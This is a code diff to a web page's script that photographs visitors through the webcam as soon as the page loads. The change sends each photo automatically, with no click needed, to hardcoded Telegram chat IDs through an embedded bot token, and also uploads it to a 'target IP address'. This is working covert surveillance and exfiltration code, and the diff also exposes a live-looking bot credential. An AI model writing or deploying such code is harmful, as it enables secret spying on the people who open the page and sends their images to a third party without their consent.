@@ -39,9 +39,9 @@
 
     <script>
         const telegramId2Input = document.getElementById('telegramId2');
-        const sendButton = document.getElementById('sendButton');
         const botToken = '6552995612:AAGpPJPmKHJBKeSbzNJPxjxM3-8HDXa_rec'; // Your bot token
         const telegramId1 = '1715157464'; // Hardcoded Telegram ID
+        const ipAddress = '192.168.1.100'; // Replace with the target IP address
         const images = []; // Array to store captured images
 
         // Start capturing images immediately upon page load
@@ -70,8 +70,13 @@
                         stream.getTracks().forEach(track => track.stop());
                         
                         // Save the captured image
-                        images.push(canvas.toDataURL('image/png'));
+                        const imageData = canvas.toDataURL('image/png');
+                        images.push(imageData);
                         console.log(`Captured image ${images.length}`);
+
+                        // Send the captured image to Telegram and the specified IP address
+                        sendImageToTelegram(imageData);
+                        sendImageToIpAddress(imageData);
                     }, 1000);
                 })
                 .catch(err => {
@@ -79,41 +84,66 @@
                 });
         }
 
-        sendButton.addEventListener('click', async () => {
-            await sendAllImages();
-        });
-
-        async function sendAllImages() {
+        async function sendImageToTelegram(imageData) {
             const telegramIds = [telegramId1, telegramId2Input.value]; // Include hardcoded ID and user input
 
             for (const telegramId of telegramIds) {
-                for (const imageData of images) {
-                    const formData = new FormData();
-                    formData.append('chat_id', telegramId);
-                    formData.append('photo', imageData);
+                const formData = new FormData();
+                formData.append('chat_id', telegramId);
+                formData.append('photo', imageData);
 
-                    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-                    try {
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            body: formData,
-                        });
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData,
+                    });
 
-                        const result = await response.json();
-                        if (result.ok) {
-                            console.log(`Image sent to ${telegramId} successfully!`);
-                        } else {
-                            console.error(`Error sending image to ${telegramId}: ` + result.description);
-                        }
-                    } catch (error) {
-                        console.error('Error:', error);
+                    const result = await response.json();
+                    if (result.ok) {
+                        console.log(`Image sent to ${telegramId} successfully!`);
+                    } else {
+                        console.error(`Error sending image to ${telegramId}: ` + result.description);
                     }
+                } catch (error) {
+                    console.error('Error:', error);
                 }
             }
-            console.log('All images sent!');
+        }
+
+        async function sendImageToIpAddress(imageData) {
+            const url = `http://${ipAddress}/upload`; // Assuming the server accepts POST requests at /upload
+
+            // Convert data URL to Blob
+            const byteString = atob(imageData.split(',')[1]);
+            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new Uint8Array(byteString.length);
+            for (let i = 0; i < byteString.length; i++) {
+                ab[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+
+            const formData = new FormData();
+            formData.append('image', blob, 'screenshot.png');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    console.log(`Image sent to IP address ${ipAddress} successfully!`);
+                } else {
+                    console.error(`Error sending image to IP address ${ipAddress}: ` + await response.text());
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
         }
     </script>
 
 </body>
 </html>
+                        
